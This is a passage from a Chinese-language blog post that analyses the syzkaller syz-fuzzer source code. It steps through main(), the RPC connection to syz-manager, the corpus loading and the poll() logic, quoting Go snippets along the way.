<code>executeReply</code> 作为终止）：</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><h1 id="0x02-main-：与-manager-建立-RPC-连接，进行初始化工作"><a href="#0x02-main-：与-manager-建立-RPC-连接，进行初始化工作" class="headerlink" title="0x02. main()：与 manager 建立 RPC 连接，进行初始化工作"></a>0x02. main()：与 manager 建立 RPC 连接，进行初始化工作</h1><p>我们还是按照惯例从程序入口点进行分析，<code>syz-fuzzer()</code> 的 <code>main()</code> 函数做的工作比较简单，主要还是一些初始化工作以及引导后续工作流程</p><h2 id="初始化参数解析与-RPC-连接，获取语料库与输入"><a href="#初始化参数解析与-RPC-连接，获取语料库与输入" class="headerlink" title="初始化参数解析与 RPC 连接，获取语料库与输入"></a>初始化参数解析与 RPC 连接，获取语料库与输入</h2><h3 id="Step-I-一些初始化工作"><a href="#Step-I-一些初始化工作" class="headerlink" title="Step.I - 一些初始化工作"></a>Step.I - 一些初始化工作</h3><p>一开始还是惯例的各种初始化和配置参数解析工作</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// nolint: funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>debug.SetGCPercent(<span class="hljs-number">50</span>)<br><br><span class="hljs-keyword">var</span> (<br>flagName     = flag.String(<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;unique name for manager&quot;</span>)<br>flagOS       = flag.String(<span class="hljs-string">&quot;os&quot;</span>, runtime.GOOS, <span class="hljs-string">&quot;target OS&quot;</span>)<br>flagArch     = flag.String(<span class="hljs-string">&quot;arch&quot;</span>, runtime.GOARCH, <span class="hljs-string">&quot;target arch&quot;</span>)<br>flagManager  = flag.String(<span class="hljs-string">&quot;manager&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;manager rpc address&quot;</span>)<br>flagProcs    = flag.Int(<span class="hljs-string">&quot;procs&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;number of parallel test processes&quot;</span>)<br>flagOutput   = flag.String(<span class="hljs-string">&quot;output&quot;</span>, <span class="hljs-string">&quot;stdout&quot;</span>, <span class="hljs-string">&quot;write programs to none/stdout/dmesg/file&quot;</span>)<br>flagTest     = flag.Bool(<span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable image testing mode&quot;</span>)      <span class="hljs-comment">// used by syz-ci</span><br>flagRunTest  = flag.Bool(<span class="hljs-string">&quot;runtest&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;enable program testing mode&quot;</span>) <span class="hljs-comment">// used by pkg/runtest</span><br>flagRawCover = flag.Bool(<span class="hljs-string">&quot;raw_cover&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;fetch raw coverage&quot;</span>)<br>)<br><span class="hljs-keyword">defer</span> tool.Init()()<br>outputType := parseOutputType(*flagOutput)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fuzzer started&quot;</span>)<br><br>target, err := prog.GetTarget(*flagOS, *flagArch)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br><br>config, execOpts, err := ipcconfig.Default(target)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create default ipc config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> *flagRawCover &#123;<br>execOpts.Flags &amp;^= ipc.FlagDedupCover<br>&#125;<br>timeouts := config.Timeouts<br>sandbox := ipc.FlagsToSandbox(config.Flags)<br></code></pre></td></tr></table></figure><p>接下来会创建一个 <code>shutdown</code> channel 并启动一个协程进行监测，当该 channel 有数据时说明遇到了一些情况，此时 syz-fuzzer 需要主动退出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">shutdown := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)<br>osutil.HandleInterrupts(shutdown)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// Handles graceful preemption on GCE.</span><br>&lt;-shutdown<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;SYZ-FUZZER: PREEMPTED&quot;</span>)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>osutil.HandleInterrupts()</code> 则是一个根据不同的目标 os 进行定制的函数，对于 unix 系 os 而言该函数定义于 <code>osutil_unix.go</code> 中，其会等待收到三个 SIGINT 信号才真正关闭程序：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// HandleInterrupts 在第一个 SIGINT 时关闭 shutdown chan</span><br><span class="hljs-comment">// (希望程序能优雅地 shutdown 并 exit)</span><br><span class="hljs-comment">// 并在第三个 SIGINT 时终止程序.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HandleInterrupts</span><span class="hljs-params">(shutdown <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;)</span></span> &#123;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>c := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> os.Signal, <span class="hljs-number">3</span>)<br>signal.Notify(c, syscall.SIGINT, syscall.SIGTERM)<br>&lt;-c<br><span class="hljs-built_in">close</span>(shutdown)<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: shutting down harder...\n&quot;</span>)<br>&lt;-c<br>fmt.Fprint(os.Stderr, <span class="hljs-string">&quot;SIGINT: terminating\n&quot;</span>)<br>os.Exit(<span class="hljs-type">int</span>(syscall.SIGINT))<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-II-与-syz-manager-间建立-RPC-通信，加载语料库"><a href="#Step-II-与-syz-manager-间建立-RPC-通信，加载语料库" class="headerlink" title="Step.II - 与 syz-manager 间建立 RPC 通信，加载语料库"></a>Step.II - 与 syz-manager 间建立 RPC 通信，加载语料库</h3><p>回到 <code>main()</code> 中，接下来会收集 Guest 信息并尝试与 Host（syz-manager） 间建立 RPC 连接，若失败则直接退出，这里我们传给 syz-manager 的是 <code>rpctype.ConnectArgs</code>，收到的响应结果为 <code>rpctype.ConnectRes</code> ，其中包含有很多信息：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">checkArgs := &amp;checkArgs&#123;<br>target:         target,<br>sandbox:        sandbox,<br>ipcConfig:      config,<br>ipcExecOpts:    execOpts,<br>gitRevision:    prog.GitRevision,<br>targetRevision: target.Revision,<br>&#125;<br><span class="hljs-keyword">if</span> *flagTest &#123;<br>testImage(*flagManager, checkArgs)<br><span class="hljs-keyword">return</span><br>&#125;<br><br>machineInfo, modules := collectMachineInfos(target)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;dialing manager at %v&quot;</span>, *flagManager)<br>manager, err := rpctype.NewRPCClient(*flagManager, timeouts.Scale)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create an RPC client: %v &quot;</span>, err)<br>&#125;<br><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;connecting to manager...&quot;</span>)<br>a := &amp;rpctype.ConnectArgs&#123;<br>Name:        *flagName,<br>MachineInfo: machineInfo,<br>Modules:     modules,<br>&#125;<br>r := &amp;rpctype.ConnectRes&#123;&#125;<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Connect&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to call Manager.Connect(): %v &quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer 中的 RPC 都会调用到 <code>syz-manager/rpc.go</code> 中的 <code>RPCServer</code> 的成员函数，我们最终会调用到 syz-manager 上的 <code>Connect()</code> 函数进行连接，其核心是调用 <code>RPCServer.RPCManagerView.fuzzerConnect()</code> 最小化语料库并拷贝 BugFrame 等信息，这里就不展开分析了：）</p><p>接下来解析要开启的特性标志位；随后检查与 syz-manager 进行 RPC 连接的响应结果中的 <code>CoverFilterBitmap</code> 是否为空，不为空则写入到 <code>&quot;syz-cover-bitmap&quot;</code> 文件中，该信息主要是给 syz-executor 用的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">featureFlags, err := csource.ParseFeaturesFlags(<span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-string">&quot;none&quot;</span>, <span class="hljs-literal">true</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CoverFilterBitmap != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err := osutil.WriteFile(<span class="hljs-string">&quot;syz-cover-bitmap&quot;</span>, r.CoverFilterBitmap); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write syz-cover-bitmap: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后若 syz-manager 返回结果中的 <code>CheckResult</code> 为空，则重新生成配置信息后通过 RPC 调用 syz-manager 的 <code>Manager.Check()</code> ，若有错误则直接退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>checkArgs.gitRevision = r.GitRevision<br>checkArgs.targetRevision = r.TargetRevision<br>checkArgs.enabledCalls = r.EnabledCalls<br>checkArgs.allSandboxes = r.AllSandboxes<br>checkArgs.featureFlags = featureFlags<br>r.CheckResult, err = checkMachine(checkArgs)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> r.CheckResult == <span class="hljs-literal">nil</span> &#123;<br>r.CheckResult = <span class="hljs-built_in">new</span>(rpctype.CheckArgs)<br>&#125;<br>r.CheckResult.Error = err.Error()<br>&#125;<br>r.CheckResult.Name = *flagName<br><span class="hljs-keyword">if</span> err := manager.Call(<span class="hljs-string">&quot;Manager.Check&quot;</span>, r.CheckResult, <span class="hljs-literal">nil</span>); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Check call failed: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> r.CheckResult.Error != <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, r.CheckResult.Error)<br>&#125;<br>&#125; <br></code></pre></td></tr></table></figure><p>这次 RPC 实际上会调用到 syz-manager 中的 <code>machineChecked()</code>，该函数会调用 <code>loadCorpus()</code> <strong>完成语料库的加载</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> machineChecked(a *rpctype.CheckArgs, enabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>) &#123;<br>mgr.mu.Lock()<br><span class="hljs-keyword">defer</span> mgr.mu.Unlock()<br>mgr.checkResult = a<br>mgr.targetEnabledSyscalls = enabledSyscalls<br>mgr.target.UpdateGlobs(a.GlobFiles)<br>mgr.loadCorpus()<br>mgr.firstConnect = time.Now()<br>&#125;<br></code></pre></td></tr></table></figure><p>回到 syz-fuzzer，若 <code>CheckResult</code> 不为空则调用 <code>target.UpdateGlobs()</code> 将 manager 返回数据存放到 <code>GlobFiles</code> 映射中，再调用 <code>Setup()</code> 根据所开启的特性配置 executor 的参数并调用 <code>osutil.RunCmd()</code> 在 5min 后启动 executor，这里就不展开了</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">else</span> &#123;<br>target.UpdateGlobs(r.CheckResult.GlobFiles)<br><span class="hljs-keyword">if</span> err = host.Setup(target, r.CheckResult.Features, featureFlags, config.Executor); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-III-初始化-Fuzzer-结构信息，获取-input-与-candidate"><a href="#Step-III-初始化-Fuzzer-结构信息，获取-input-与-candidate" class="headerlink" title="Step.III - 初始化 Fuzzer 结构信息，获取 input 与 candidate"></a>Step.III - 初始化 Fuzzer 结构信息，获取 input 与 candidate</h3><p>之后日志输出开启的系统调用数量及特性信息，创建 IPC 配置信息，若设置了 <code>runtest</code> 标志位（默认为 false）则调用 <code>runTest()</code> 后直接返回，这个主要是测试用的这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syscalls: %v&quot;</span>, <span class="hljs-built_in">len</span>(r.CheckResult.EnabledCalls[sandbox]))<br><span class="hljs-keyword">for</span> _, feat := <span class="hljs-keyword">range</span> r.CheckResult.Features.Supported() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v: %v&quot;</span>, feat.Name, feat.Reason)<br>&#125;<br>createIPCConfig(r.CheckResult.Features, config)<br><br><span class="hljs-keyword">if</span> *flagRunTest &#123;<br>runTest(target, manager, *flagName, config.Executor)<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p>之后创建 <code>needPoll</code> channel 并写入数据，主要用来标识是否需要向 <code>syz-manager()</code> 发起 poll（向 syz-manager 获取语料库与 candidate）；接下来创建了一个标识当前 <code>syz-fuzzer</code> 信息的 Fuzzer 结构体以及一个 <code>ipc.Gate</code> 结构体（用于将并发级别和窗口限制为给定的值）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><br>needPoll := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;, <span class="hljs-number">1</span>)<br>needPoll &lt;- <span class="hljs-keyword">struct</span>&#123;&#125;&#123;&#125;<br>fuzzer := &amp;Fuzzer&#123;<br>name:                     *flagName,<br>outputType:               outputType,<br>config:                   config,<br>execOpts:                 execOpts,<br>workQueue:                newWorkQueue(*flagProcs, needPoll),<br>needPoll:                 needPoll,<br>manager:                  manager,<br>target:                   target,<br>timeouts:                 timeouts,<br>faultInjectionEnabled:    r.CheckResult.Features[host.FeatureFault].Enabled,<br>comparisonTracingEnabled: r.CheckResult.Features[host.FeatureComparisons].Enabled,<br>corpusHashes:             <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[hash.Sig]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>checkResult:              r.CheckResult,<br>fetchRawCover:            *flagRawCover,<br>noMutate:                 r.NoMutateCalls,<br>stats:                    <span class="hljs-built_in">make</span>([]<span class="hljs-type">uint64</span>, StatCount),<br>&#125;<br>gateCallback := fuzzer.useBugFrames(r, *flagProcs)<br>fuzzer.gate = ipc.NewGate(<span class="hljs-number">2</span>**flagProcs, gateCallback)<br><br></code></pre></td></tr></table></figure><p>接下来是一个小循环，调用 <code>poll()</code> 以<strong>向 syz-manager 获取语料库与 candidate 加入到本地工作队列中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> needCandidates, more := <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>; more; needCandidates = <span class="hljs-literal">false</span> &#123;<br>more = fuzzer.poll(needCandidates, <span class="hljs-literal">nil</span>)<br><span class="hljs-comment">// 该循环在 qemu 模拟中为 &quot;no output&quot; , 以告诉 manager 我们还没死.</span><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;fetching corpus: %v, signal %v/%v (executing program)&quot;</span>,<br><span class="hljs-built_in">len</span>(fuzzer.corpus), <span class="hljs-built_in">len</span>(fuzzer.corpusSignal), <span class="hljs-built_in">len</span>(fuzzer.maxSignal))<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="poll-：通过-RPC-向-syz-manager-获取语料库与-candidate-加入本地工作队列中"><a href="#poll-：通过-RPC-向-syz-manager-获取语料库与-candidate-加入本地工作队列中" class="headerlink" title="poll()：通过 RPC 向 syz-manager 获取语料库与 candidate 加入本地工作队列中"></a>poll()：通过 RPC 向 syz-manager 获取语料库与 candidate 加入本地工作队列中</h4><p>该函数主要做了两件事：</p><ul><li>通过 RPC 向 syz-manager 获取语料库与 candidate</li><li>将获得的 candidate 加入本地工作队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(fuzzer *Fuzzer)</span></span> poll(needCandidates <span class="hljs-type">bool</span>, stats <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">uint64</span>) <span class="hljs-type">bool</span> &#123;<br>a := &amp;rpctype.PollArgs&#123;<br>Name:           fuzzer.name,<br>NeedCandidates: needCandidates,<br>MaxSignal:      fuzzer.grabNewSignal().Serialize(),<br>Stats:          stats,<br>&#125;<br>r := &amp;rpctype.PollRes&#123;&#125;<br>    <span class="hljs-comment">/* RPC 向 syz-manager 请求信息 */</span> <br><span class="hljs-keyword">if</span> err := fuzzer.manager.Call(<span class="hljs-string">&quot;Manager.Poll&quot;</span>, a, r); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;Manager.Poll call failed: %v&quot;</span>, err)<br>&#125;<br>    <span class="hljs-comment">/* 解析：最大信号数量 */</span><br>maxSignal := r.MaxSignal.Deserialize()<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: candidates=%v inputs=%v signal=%v&quot;</span>,<br><span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), maxSignal.Len())<br>fuzzer.addMaxSignal(maxSignal)<br>    <span class="hljs-comment">/* 解析：syz-manager 给予的从其他 fuzzer 获得的新输入 */</span><br><span class="hljs-keyword">for</span> _, inp := <span class="hljs-keyword">range</span> r.NewInputs &#123;<br>fuzzer.addInputFromAnotherFuzzer(inp)<br>&#125;<br>    <span class="hljs-comment">/* 解析：candidate */</span><br><span class="hljs-keyword">for</span> _, candidate := <span class="hljs-keyword">range</span> r.Candidates &#123;<br>fuzzer.addCandidateInput(candidate)<br>&#125;<br><span class="hljs-keyword">if</span> needCandidates &amp;&amp; <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &amp;&amp; atomic.LoadUint32(&amp;fuzzer.triagedCandidates) == <span class="hljs-number">0</span> &#123;<br>atomic.StoreUint32(&amp;fuzzer.triagedCandidates, <span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(r.NewInputs) != <span class="hljs-number">0</span> || <span class="hljs-built_in">len</span>(r.Candidates) != <span class="hljs-number">0</span> || maxSignal.Len() != <span class="hljs-number">0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>该函数会通过 RPC 调用到 syz-manager 中 <code>syz-manager/rpc.go</code> 下的 <code>Poll()</code> 函数：</p><ul><li>首先会获取在 syz-manager 中该 syz-fuzzer 的信息，并检查最大信号量</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(serv *RPCServer)</span></span> Poll(a *rpctype.PollArgs, r *rpctype.PollRes) <span class="hljs-type">error</span> &#123;<br>serv.stats.mergeNamed(a.Stats)<br><br>serv.mu.Lock()<br><span class="hljs-keyword">defer</span> serv.mu.Unlock()<br><br>f := serv.fuzzers[a.Name]<br><span class="hljs-keyword">if</span> f == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 若我们调用了 shutdownInstance 、但已经有一个来自该实例的待处理请求，则这是有可能的</span><br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;poll: fuzzer %v is not connected&quot;</span>, a.Name)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>newMaxSignal := serv.maxSignal.Diff(a.MaxSignal.Deserialize())<br><span class="hljs-keyword">if</span> !newMaxSignal.Empty() &#123;<br>serv.maxSignal.Merge(newMaxSignal)<br>serv.stats.maxSignal.set(<span class="hljs-built_in">len</span>(serv.maxSignal))<br><span class="hljs-keyword">for</span> _, f1 := <span class="hljs-keyword">range</span> serv.fuzzers &#123;<br><span class="hljs-keyword">if</span> f1 == f || f1.rotated &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>f1.newMaxSignal.Merge(newMaxSignal)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>如果该 syz-fuzzer 对应的 VM 实例正在轮转运行，则直接返回</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> f.rotated &#123;<br><span class="hljs-comment">// 让轮转中的 VMs 独立运行，不要向他们发送任何东西</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>接下来写入新的最大信号，之后检查 syz-fuzzer 是否向 syz-manager 请求了新的 candidate，若是则调用 <code>candidateBatch()</code> 获取，该函数的作用主要是从 syz-manager 上的 candidate 队列中获取一定数量的 candidate</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go">r.MaxSignal = f.newMaxSignal.Split(<span class="hljs-number">2000</span>).Serialize()<br><span class="hljs-keyword">if</span> a.NeedCandidates &#123;<br>r.Candidates = serv.mgr.candidateBatch(serv.batchSize)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>若获取到的 candidate 数量为 0，说明是第一次 <code>poll()</code>，这时便从初始化时所读取的语料库中获取输入作为 candidate 返还给 syz-fuzzer</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(r.Candidates) == <span class="hljs-number">0</span> &#123;<br>batchSize := serv.batchSize<br><span class="hljs-comment">// 当 fuzzer 启动时, 其会抽取所有的语料库.</span><br><span class="hljs-comment">// 若我们使用最后的 batchSize 进行操作, 这将会非常慢</span><br><span class="hljs-comment">// (对于 50k 的语料库与慢内核而言，一批大小为 6 可能需要10min以上的时间).</span><br><span class="hljs-comment">// 所以在最初就使用更大的批量 (we use no stats as approximation of initial pump).</span><br><span class="hljs-keyword">const</span> initialBatch = <span class="hljs-number">50</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a.Stats) == <span class="hljs-number">0</span> &amp;&amp; batchSize &lt; initialBatch &#123;<br>batchSize = initialBatch<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; batchSize &amp;&amp; <span class="hljs-built_in">len</span>(f.inputs) &gt; <span class="hljs-number">0</span>; i++ &#123;<br>last := <span class="hljs-built_in">len</span>(f.inputs) - 